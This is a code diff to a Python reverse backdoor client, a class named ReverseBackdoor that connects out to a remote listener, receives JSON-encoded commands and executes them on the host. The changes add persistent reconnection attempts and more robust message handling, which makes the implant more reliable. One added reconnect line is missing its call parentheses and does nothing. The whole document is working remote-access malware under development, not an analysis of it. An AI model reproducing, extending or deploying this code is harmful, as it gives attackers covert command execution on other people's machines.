@@ -1,8 +1,6 @@
 #!usr/bin/env python3
-from json.decoder import JSONDecodeError
 import socket
 import subprocess
-import sys
 import json
 
 
@@ -13,7 +11,18 @@ class ReverseBackdoor:
 
 		# creating a socket : socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)
 		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.connection.connect((self.ip,self.port))
+		self.connect_to_listener()
+	
+
+	def connect_to_listener(self):
+		connected = False
+		while not connected:
+			try:
+				self.connection.connect((self.ip,self.port))
+				connected = True
+				print('\r[*] Connection Established.')
+			except ConnectionRefusedError:
+				print('\r[-] Connection Refused.', end='')
 
 
 	def serial_send(self, data:str):
@@ -24,15 +33,18 @@ class ReverseBackdoor:
 		self.connection.send(bytes_json_data)
 
 
-	def serial_receive(self)->str:
+	def serial_receive(self) -> str :
 		'''
-		receive serialized data over TCP socket 
-		and retrieve original data.
+        receive serialized data over TCP socket
+        and retrieve original data.
 		'''
-		bytes_json_data = self.connection.recv(1024)
-		str_json_data = str(bytes_json_data, encoding='utf-8')
-		data = json.loads(str_json_data)
-		return data
+		bytes_json_data = b''
+		while True:
+			try:
+				bytes_json_data += self.connection.recv(1024)
+				return json.loads(bytes_json_data)
+			except json.JSONDecodeError:
+				continue
 
 
 	def execute_command(self,command:str)->str:
@@ -51,8 +63,7 @@ class ReverseBackdoor:
 
 			except json.JSONDecodeError:
 				print('[-] Lost Connection.')
-				self.connection.close()
-				sys.exit()
+				self.connect_to_listener
 
 			except Exception as e:
 				exception = ('[-] Exception : ' + str(e))
